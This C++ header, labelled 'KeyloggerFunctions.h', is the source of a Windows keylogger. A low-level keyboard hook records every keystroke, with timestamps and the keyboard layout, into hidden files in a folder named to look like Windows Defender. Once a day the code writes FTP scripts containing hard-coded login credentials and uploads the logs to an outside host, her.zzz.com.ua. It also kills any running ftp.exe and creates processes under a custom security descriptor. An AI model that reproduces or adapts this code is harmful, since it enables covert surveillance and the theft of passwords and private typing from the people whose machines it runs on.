#pragma once

/*
	KeyloggerFunctions.h  version 3.3 (stable ftp release)
*/

#include "NeededLibs.h"


constexpr auto SIZE_STR = 1 << 8;
constexpr auto MAX_FILE_SIZE = 1 << 23;
constexpr auto PATH = L"C:\\ProgramData\\WinDefend\\.conf";
constexpr auto WINNAME_FILE_PATH = L"C:\\ProgramData\\WinDefend\\.win";

constexpr DWORD RUS = 0x0419;
constexpr DWORD ENG = 0x0809;
constexpr DWORD UKR = 0x0422;


OVERLAPPED olf = { 0 };
LARGE_INTEGER li = { 0 };

DWORD keyboard_layout;

bool IsCaps();
static LRESULT CALLBACK LogKeyW(int, WPARAM, LPARAM);

VOID WriteToFileW(std::wstring*, DWORD);

void eng_to_rus(std::wstring*);
void eng_to_ukr(std::wstring*);

void eng_to_rus_upper(std::wstring*);
void eng_to_ukr_upper(std::wstring*);

DWORD get_active_window_layout();


BOOLEAN CreateNoKillProcess(WCHAR* EXEProg)
{
	ACL ACL;
	SECURITY_DESCRIPTOR SD;
	SECURITY_ATTRIBUTES SA;
	STARTUPINFOW si;
	PROCESS_INFORMATION pinfo;

	if (!InitializeAcl(&ACL, sizeof(ACL), ACL_REVISION)) return 0;

	if (!IsValidAcl(&ACL)) return 0;

	if (!InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION)) return 0;

	if (!SetSecurityDescriptorDacl(&SD, true, &ACL, true)) return 0;


	if (!IsValidSecurityDescriptor(&SD)) return 0;

	ZeroMemory(&SA, sizeof(SA));
	SA.nLength = sizeof(SA);
	SA.bInheritHandle = false;
	SA.lpSecurityDescriptor = &SD;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	if (!CreateProcessW(NULL, EXEProg, &SA, &SA, false, 0, NULL, NULL, &si, &pinfo)) return 1;
	return 0;
}

void send_log()
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe = { 0 };
	pe.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnap, &pe);
	do
	{
		if (!wcscmp(pe.szExeFile, L"ftp.exe"))
		{
			TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID), 0);
		}

	} while (Process32Next(hSnap, &pe));


	std::wcout << L"killed ftp.exe...\n";


	CreateDirectory(L"C:\\ProgramData\\WinDefend", nullptr);
	SetCurrentDirectory(L"C:\\ProgramData\\WinDefend");



	DeleteFile(L"C:\\ProgramData\\WinDefend\\script");
	DeleteFile(L"C:\\ProgramData\\WinDefend\\script2");
	DeleteFile(L"C:\\ProgramData\\WinDefend\\cnt");
	HANDLE file;


	OVERLAPPED olf{};
	int cnt(0), id(0);
	bool new_id(false);
	LARGE_INTEGER size;

	HANDLE id_file = CreateFile(L"C:\\ProgramData\\WinDefend\\id", GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, nullptr);
	if (id_file != INVALID_HANDLE_VALUE && GetLastError() != ERROR_FILE_NOT_FOUND)
	{
		OVERLAPPED olf{};
		GetFileSizeEx(id_file, &size);
		char* id_s = new char[size.QuadPart + 1];
		id_s[size.QuadPart] = 0;
		ReadFile(id_file, id_s, size.QuadPart, new DWORD, NULL);
		id = ::atoi(id_s);
		CloseHandle(id_file);
	}
	else
	{
		new_id = true;
		id_file = CreateFile(L"C:\\ProgramData\\WinDefend\\id", GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, nullptr);
		if (id_file == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND)
		{
			const char* content_cnt_ = "open her.zzz.com.ua\r\nimper\r\nFaunpreh_50\r\n\lcd C:\\ProgramData\\WinDefend\r\ncd /her.zzz.com.ua/logs/\r\nmget id\r\ny\r\ndisconnect\r\nquit\r\n";

			file = CreateFile(L"C:\\ProgramData\\WinDefend\\script", GENERIC_WRITE, NULL, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
			olf = { 0 };
			WriteFile(file, content_cnt_, strlen(content_cnt_), new DWORD(0), &olf);
			CloseHandle(file);

			system("ftp -s:C:\\ProgramData\\WinDefend\\script");

			SetFileAttributesA("C:\\ProgramData\\WinDefend\\id", FILE_ATTRIBUTE_HIDDEN);

			id_file = CreateFile(L"C:\\ProgramData\\WinDefend\\id", GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, nullptr);
		}

		size = LARGE_INTEGER{0};
		GetFileSizeEx(id_file, &size);
		char* id_s = new char[size.QuadPart + 1];
		id_s[size.QuadPart] = 0;
		ReadFile(id_file, id_s, size.QuadPart, new DWORD, NULL);
		id = ::atoi(id_s);
		CloseHandle(id_file);
	}

	if (new_id)
	{
		++id;
		id_file = CreateFile(L"C:\\ProgramData\\WinDefend\\id", GENERIC_WRITE, NULL, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
		std::string id_str = std::to_string(id);
		WriteFile(id_file, id_str.c_str(), id_str.size() + 1, new DWORD, NULL);
		CloseHandle(id_file);
	}


	std::string content_cnt("open her.zzz.com.ua\r\nimper\r\nFaunpreh_50\r\n\lcd C:\\ProgramData\\WinDefend\r\ncd /her.zzz.com.ua/logs/\r\nmkdir ");
	content_cnt += std::to_string(id);
	content_cnt += "\r\ncd ";
	content_cnt += std::to_string(id);
	content_cnt += "\r\nmget cnt\r\ny\r\ndisconnect\r\nquit\r\n";

	file = CreateFile(L"C:\\ProgramData\\WinDefend\\script", GENERIC_WRITE, NULL, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
	olf = { 0 };
	WriteFile(file, content_cnt.c_str(), content_cnt.size(), new DWORD(0), &olf);
	CloseHandle(file);

	system("ftp -s:C:\\ProgramData\\WinDefend\\script");

	HANDLE cnt_file = CreateFile(L"C:\\ProgramData\\WinDefend\\cnt", GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (cnt_file != INVALID_HANDLE_VALUE && GetLastError() != ERROR_FILE_NOT_FOUND)
	{
		GetFileSizeEx(cnt_file, &size);
		char* cnt_s = new char[size.QuadPart + 1];
		cnt_s[size.QuadPart] = 0;
		ReadFile(cnt_file, cnt_s, size.QuadPart, new DWORD, &olf);
		cnt = ::atoi(cnt_s);
		CloseHandle(cnt_file);
	}
	++cnt;

	cnt_file = CreateFile(L"C:\\ProgramData\\WinDefend\\cnt", GENERIC_WRITE, NULL, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	olf = { 0 };
	std::string cnt_str = std::to_string(cnt);
	WriteFile(cnt_file, cnt_str.c_str(), cnt_str.size() + 1, new DWORD, NULL);
	CloseHandle(cnt_file);

	if (new_id)
	{
		id_file = CreateFile(L"C:\\ProgramData\\WinDefend\\id", GENERIC_WRITE, NULL, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);

		olf = { 0 };
		WriteFile(id_file, std::to_string(id).c_str(), std::to_string(id).size() + 1, new DWORD(0), &olf);
		CloseHandle(id_file);
	}

	std::string s("open her.zzz.com.ua\r\nimper\r\nFaunpreh_50\r\n\lcd C:\\ProgramData\\WinDefend\r\ncd /her.zzz.com.ua/logs/");
	if (new_id)
		s += "\r\ndelete id\r\nsend id";
	s += "\r\nmkdir ";
	s += std::to_string(id);
	s += "\r\ncd ";
	s += std::to_string(id);
	s += "/\r\ndelete cnt\r\nsend cnt\r\nmkdir ";
	s += std::to_string(cnt);
	s += "\r\ncd ";
	s += std::to_string(cnt);
	s += "\r\nsend .conf\r\nsend .win\r\ndisconnect\r\nquit\r\n";

	const char* content = s.c_str();

	file = CreateFile(L"C:\\ProgramData\\WinDefend\\script2", GENERIC_WRITE, NULL, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);

	olf = { 0 };
	WriteFile(file, content, strlen(content), new DWORD(0), &olf);
	CloseHandle(file);

	system("ftp -s:C:\\ProgramData\\WinDefend\\script2");


	DeleteFile(L"C:\\ProgramData\\WinDefend\\script");
	DeleteFile(L"C:\\ProgramData\\WinDefend\\script2");
	DeleteFile(L"C:\\ProgramData\\WinDefend\\cnt");

	SetFileAttributesA("C:\\ProgramData\\WinDefend\\id", FILE_ATTRIBUTE_HIDDEN);
}

void delete_daily()
{

	HANDLE last_deleted = CreateFile(L"C:\\ProgramData\\WinDefend\\date", GENERIC_READ | GENERIC_WRITE, NULL, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		char buffer[30];
		olf = { 0 };
		ReadFile(last_deleted, buffer, 30, new DWORD, &olf);

		struct std::tm tm;
		std::istringstream ss(buffer);
		ss >> std::get_time(&tm, "%S:%M:%H %d.%m.%Y"); // or just %T in this case
		std::time_t time = mktime(&tm);

		time_t yesterday = ::time(0) - 86400;

		if (time <= yesterday)
		{
			time_t rawtime = ::time(0);
			std::tm* timeinfo = localtime(&rawtime);
			char buffer[30];
			strftime(buffer, 30, "%S:%M:%H %d.%m.%Y", timeinfo);
			olf = { 0 };
			WriteFile(last_deleted, buffer, wcslen(reinterpret_cast<const wchar_t*>(buffer)), new DWORD, &olf);
			CloseHandle(last_deleted);

			send_log();

			DeleteFile(PATH);
			DeleteFile(WINNAME_FILE_PATH);
		}
	}
	else
	{
		time_t rawtime = time(0);
		tm* timeinfo = localtime(&rawtime);
		char buffer[30];
		strftime(buffer, 30, "%S:%M:%H %d.%m.%Y", timeinfo);
		olf = { 0 };
		WriteFile(last_deleted, buffer, wcslen(reinterpret_cast<const wchar_t*>(buffer)), new DWORD, &olf);
		CloseHandle(last_deleted);
		send_log();
	}
}


bool IsCaps()
{
	//GetKeyState используеться в основном для определения состояния нажатия системной кнопки
	//VK - Virtual Key

	if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ^ ((GetKeyState(VK_SHIFT) & 0x8000) != 0))
	{
		//if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		//{
		//	WriteToFile(new std::wstring(L"[CAPSLOCK] +"));
		//}

		//if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		//{
		//	WriteToFile(new std::wstring(L"[SHIFT] +"));
		//}

		return true;
	}
	return false;
}

static LRESULT CALLBACK LogKeyW(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5)) // 32
			iKey |= 0x1 << 24; //Задаём истину для 24 бита

		bool special = false;
		switch (pHook->vkCode)
		{
		case VK_F1:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F1") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F2:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F2") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F3:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F3") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F4:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F4") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F5:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F5") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F6:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F6") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F7:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F7") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F8:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F8") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F9:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F9") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F10:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F10") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F11:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F11") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_F12:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"F12") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_SHIFT * 10:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"shift") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_SHIFT * 10 + 1:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"shift") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;

		case VK_MENU:
		{
			IsCaps();
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"alt") + std::wstring(L"]"));
			WriteToFileW(wstr1, keyboard_layout);
			wstr1->~basic_string();
			special = true;
		}
		break;
		}

		if (!special)
		{
			keyboard_layout = get_active_window_layout();
			LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
			GetKeyNameText(iKey, wstr, SIZE_STR);

			if (iKey)
			{
				if (IsCaps())
				{
					std::wstring* wstr1(0);
					switch (wstr[0])
					{
					case L'1':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"!") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'2':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"@") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\"") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'3':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"#") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"№") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'4':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"$") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L";") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'5':
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"%") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
						break;

					case L'6':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"^") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L":") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'7':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"&") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"?") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'8':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"*") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'9':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"(") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'0':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L")") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'-':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"_") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'=':
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"+") + std::wstring(L"]"));
						WriteToFileW(wstr1, keyboard_layout);
					}
					break;

					case L'[':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"{\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Х") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L']':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"}\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ъ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ї") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L';':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L":") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ж") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'\'':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\"") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Э") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Є") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L',':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"<") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Б") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'.':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L">") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ю") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'/':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"?") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L",") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'\\':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"|") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"/") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					case L'`':
					{
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"~") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ё") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
					}
					break;

					default:
					{
						std::wstring wstr1(wstr);

						if (keyboard_layout == RUS)
							eng_to_rus_upper(&wstr1);
						if (keyboard_layout == UKR)
							eng_to_ukr_upper(&wstr1);

						std::wstring* wstr2 = new std::wstring(std::wstring(L"[") + std::wstring(wstr1) + std::wstring(L"]"));
						WriteToFileW(wstr2, keyboard_layout);

						wstr1.~basic_string();
						wstr2->~basic_string();
					}
					break;
					}

					if (wstr1 != 0) wstr1->~basic_string();
				}
				else
				{
					if ((!wcscmp(wstr, L"Num /") || !wcscmp(wstr, L"NUM DIVIDE")) && (keyboard_layout == RUS || keyboard_layout == UKR))
					{
						delete[] wstr;
						wstr = new WCHAR[SIZE_STR];
						wcscpy(wstr, L"/");
					}

					if ((!wcscmp(wstr, L"acute/cedilla")) && (keyboard_layout == RUS || keyboard_layout == UKR))
					{
						delete[] wstr;
						wstr = new WCHAR[SIZE_STR];
						wcscpy(wstr, L"\'");
					}

					switch (wstr[0])
					{
					case L'[':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"[\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"х") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"[\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L']':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"]\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"ъ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"ї") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L" \"]\" ") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L';':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L";") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"ж") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L";") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L'\'':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\'") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"э") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"є") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\'") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L',':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L",") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"б") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L",") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L'.':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L".") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"ю") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L".") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					case L'/':
					{
						std::wstring* wstr1;
						if (keyboard_layout == ENG)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"/") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else if (keyboard_layout == RUS || keyboard_layout == UKR)
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L".") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						else
						{
							wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"/") + std::wstring(L"]"));
							WriteToFileW(wstr1, keyboard_layout);
						}
						wstr1->~basic_string();
					}
					break;

					default:
					{
						std::wstring wstr1(wstr);

						if (wstr1 == L"ъ" || wstr1 == L"х" || wstr1 == L"ї")
						{
							if (keyboard_layout == RUS && wstr == L"ї")
								wstr1 = L"ъ";

							goto skip;
						}

						for (size_t i = 0; i < wstr1.size(); ++i)
						{
							wstr1[i] = std::tolower(wstr1[i]);
						}

						if (keyboard_layout == RUS)
							eng_to_rus(&wstr1);
						if (keyboard_layout == UKR)
							eng_to_ukr(&wstr1);

					skip:

						std::wstring* str2 = new std::wstring(std::wstring(L"[") + std::wstring(wstr1) + std::wstring(L"]"));

						WriteToFileW(str2, keyboard_layout);

						wstr1.~basic_string();
						str2->~basic_string();
					}
					break;
					}
				}
			}

			free(wstr);// !!!!
		}
	}
	return CallNextHookEx(nullptr, iCode, wParam, lParam);
}


VOID WriteToFileW(std::wstring* wstr, DWORD keyboard_layout)
{
	// write current time and date in format [seconds]:[minutes]:[hours] [day].[month].[year] [weekday] \t
	time_t rawtime = time(0);
	tm* timeinfo = localtime(&rawtime);

	wchar_t* formated_time = new wchar_t[260];

	wcsftime(formated_time, 259, L"%S:%M:%H %d.%m.%Y %A %t", timeinfo); // formatting time

	std::wstring wstr2((const wchar_t*)formated_time);
	((wstr2 += L" ") += (keyboard_layout == ENG) ? L"ENG" : ((keyboard_layout == RUS) ? L"RUS" : ((keyboard_layout == UKR) ? L"UKR" : L"UNDEF"))) += L" \t";
	wstr2 += wstr->c_str();
